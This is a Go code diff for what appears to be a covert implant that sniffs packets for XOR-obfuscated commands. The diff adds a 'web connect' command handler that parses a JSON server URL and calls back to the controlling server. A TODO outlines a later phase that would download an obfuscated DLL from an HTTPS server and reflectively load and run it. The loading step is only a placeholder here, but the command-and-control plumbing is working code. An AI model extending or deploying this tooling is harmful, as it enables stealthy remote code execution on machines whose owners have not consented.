@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"log"
 	"net"
@@ -392,6 +393,29 @@ func startSniffer() {
 			} else {
 				log.Printf("DEBUG-COMMAND-13: Ping response sent successfully")
 			}
+
+		case common.CommandWebConnect:
+			log.Printf("DEBUG-COMMAND-20: Received web connect command")
+
+			// Extract the payload data (JSON format)
+			if len(payloadToCheck) <= dataIndex {
+				log.Printf("DEBUG-COMMAND-21: No payload data in web connect command")
+				continue
+			}
+
+			// Get the web connect command data
+			payloadData := string(bytes.Trim(common.XORDecrypt(payloadToCheck[dataIndex:], '.'), "\x00"))
+			log.Printf("DEBUG-COMMAND-22: Web connect payload: %s", payloadData)
+
+			// Parse the JSON payload
+			var webConnectPayload common.WebConnectPayload
+			if err := json.Unmarshal([]byte(payloadData), &webConnectPayload); err != nil {
+				log.Printf("DEBUG-COMMAND-23: Failed to parse web connect payload: %v", err)
+				continue
+			}
+
+			// Execute the web connect command in a separate goroutine
+			go executeWebConnect(webConnectPayload)
 		}
 	}
 }
@@ -412,4 +436,34 @@ func main() {
 
 	// Start the packet sniffer (this blocks)
 	startSniffer()
+}
+
+// executeWebConnect handles the web connect command for reflective loading
+func executeWebConnect(payload common.WebConnectPayload) {
+	log.Printf("Executing web connect command to %s", payload.ServerURL)
+
+	// Create a response message to send back to the server
+	var responseMsg string
+
+	// TODO: Implement reflective loading logic here in Phase 2
+	// This will include:
+	// 1. Connecting to the HTTPS server
+	// 2. Downloading the obfuscated DLL
+	// 3. Extracting the function name from the payload metadata
+	// 4. Performing the reflective loading and execution
+
+	// For now, just set a placeholder response
+	responseMsg = fmt.Sprintf("Web connect command received, but reflective loading not yet implemented. Target URL: %s",
+		payload.ServerURL)
+
+	// Send the response back to the server
+	log.Printf("Sending response for web connect command")
+	responsePacket := common.NewOutputPacket(agent.ServerIP.String(), responseMsg)
+
+	// Send the response
+	if err := responsePacket.ChunkAndSendOutput(); err != nil {
+		log.Printf("Error sending web connect response: %v", err)
+	} else {
+		log.Printf("Web connect response sent successfully")
+	}
 }
